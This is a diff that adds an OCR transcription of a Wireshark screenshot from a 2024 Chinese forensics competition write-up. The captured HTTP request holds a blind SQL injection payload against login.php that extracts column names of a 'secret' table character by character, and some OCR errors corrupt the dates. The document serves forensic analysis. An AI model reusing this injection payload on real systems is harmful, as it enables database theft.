@@ -1,0 +1,19 @@
+# OCR: b207cc0c13bb1cb1272e837752f478bf.webp
+# 来源: ./02-WriteUp/2024/2024-数证杯-决赛个人赛/b207cc0c13bb1cb1272e837752f478bf.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:14
+
+Wireshark·追踪HTTP流(tcp.streameq1535)·检材_网络流量包.pcapng
+02:33:20/685.7MB
+国：
+口
+GET/login.php?name=lucy%27+and+substr%28%28select+group_concat%28column_name%29+++++++++++++++++from+information_schema.columns+where+table_schema%3D%27secret%27+and+table_na
+me%3D%27secret%27%29%2c13%2c1%29+%3D%27+%27--+&submit=HTTP/1.1 Host：192.168.22.139:7443
+User-Agent:python-requests/2.28.1
+Accept-Encoding:gzip,deflate Accept：*/*
+Connection: keep-alive HTTP/1.1200OK
+Server:nginx/1.15.11
+Date: Thu, 24 oct 2o24 9:29:25 GMT Content-Type:text/html;charset=utf-8 Transfer-Encoding:chunked
+Connection:keep-alive X-Powered-By: PHP/7.3.4
+Set-Cookie：PHPsEssID=3enobcjgtunainvbmvkhvi46jp;path=/ Expires: Thu, 19 Nov 1981 o8:52:eo GMT
+X
